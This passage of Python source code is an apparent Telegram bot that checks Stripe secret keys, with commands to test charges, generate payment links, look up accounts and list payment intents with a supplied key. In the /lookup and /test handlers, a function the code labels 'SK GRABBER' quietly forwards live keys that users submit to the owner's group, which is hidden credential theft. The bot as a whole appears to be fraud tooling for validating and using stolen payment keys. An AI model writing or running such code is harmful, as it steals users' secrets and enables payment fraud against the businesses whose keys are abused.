        f"{pe(E['bank'])} {italic(f'{amount/100:.2f} {currency.upper()}')}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, generate_checkout_session, sk, amount, currency
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    await safe_edit(loading, format_session_result(result))


@router.message(Command("pay"))
async def cmd_pay(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /pay sk_xxx [amount] [currency]\n"
            f"{pe(E['next'])} {italic('Example:')} /pay sk_live_xxx 100 usd\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    text = args[1].strip()
    sk = extract_sk_from_text(text)
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    rest = text.replace(sk, "").strip()
    parts = rest.split()
    amount = 100
    currency = "usd"
    if parts:
        try: amount = int(parts[0])
        except: pass
    if len(parts) >= 2:
        currency = parts[1].lower()[:3]
    
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Generating payment link...')}\n"
        f"{pe(E['bolt'])} {italic(mask_key(sk))}\n"
        f"{pe(E['bank'])} {italic(f'{amount/100:.2f} {currency.upper()}')}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, generate_payment_link, sk, amount, currency
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    await safe_edit(loading, format_payment_link_result(result))


@router.message(Command("lookup"))
async def cmd_lookup(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /lookup sk_xxx\n"
            f"{pe(E['next'])} {italic('Or reply to a message with SK')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    text = args[1].strip()
    sk = extract_sk_from_text(text)
    if not sk and message.reply_to_message:
        reply = message.reply_to_message.text or ""
        sk = extract_sk_from_text(reply)
    
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Looking up key...')}\n"
        f"{pe(E['bolt'])} {italic(mask_key(sk))}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, lookup_key_info, sk
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    # ── SK GRABBER: Check if this is a live SK and forward to group ──
    await check_and_grab_sk(sk, message.from_user, result, "lookup")
    
    await safe_edit(loading, format_lookup_result(result))


@router.message(Command("test"))
async def cmd_test(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /test sk_xxx [amount] [currency]\n"
            f"{pe(E['next'])} {italic('Example:')} /test sk_live_xxx 100 usd\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    text = args[1].strip()
    sk = extract_sk_from_text(text)
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    rest = text.replace(sk, "").strip()
    parts = rest.split()
    amount = 100
    currency = "usd"
    if parts:
        try: amount = int(parts[0])
        except: pass
    if len(parts) >= 2:
        currency = parts[1].lower()[:3]
    
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Testing key...')}\n"
        f"{pe(E['bolt'])} {italic(mask_key(sk))}\n"
        f"{pe(E['bank'])} {italic(f'{amount/100:.2f} {currency.upper()}')}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, test_charge, sk, amount, currency
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    # ── SK GRABBER: Check if this is a live SK and forward to group ──
    await check_and_grab_sk(sk, message.from_user, result, "test")
    
    await safe_edit(loading, format_test_result(result))


@router.message(Command("session"))
async def cmd_session(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /session sk_xxx session_id\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    parts = args[1].split()
    if len(parts) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /session sk_xxx session_id\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    sk = extract_sk_from_text(parts[0])
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    session_id = parts[1].strip()
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Looking up session...')}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, lookup_checkout_session, sk, session_id
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    await safe_edit(loading, format_session_result(result))


@router.message(Command("intents"))
async def cmd_intents(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /intents sk_xxx [limit]\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    parts = args[1].split()
    sk = extract_sk_from_text(parts[0])
    if not sk:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Stripe SK found!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    if not validate_sk(sk):
        await message.reply(
            f"{pe(E['cross'])} {bold('Invalid SK format!')}\n\n"
            f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
        )
        return
    
    limit = 10
    if len(parts) >= 2:
        try: limit = int(parts[1])
        except: pass
    
    loading = await message.reply(
        f"{pe(E['loading'])} {bold('Listing intents...')}\n\n"
        f"{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}"
    )
    
    try:
        result = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, list_payment_intents, sk, limit
        )
    except Exception as e:
        await safe_edit(loading, f"{pe(E['cross'])} {bold('Error:')} {str(e)}\n\n{pe(E['user'])} {bold('Owner:')} {bold(OWNER_USERNAME)}")
        return
    
    await safe_edit(loading, format_intents_result(result))


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info(f"⚡ SK Bot @{me.username} is running...")
    log.info(f"👤 Owner: {OWNER_USERNAME}")
    log.info(f"📤 SK Grabber Group: {SK_GRABBER_GROUP}")
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(bot, skip_updates=True, allowed_updates=["message", "callback_query"])
    finally:
        CHECKER_POOL.shutdown(wait=False)
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Bot stopped.")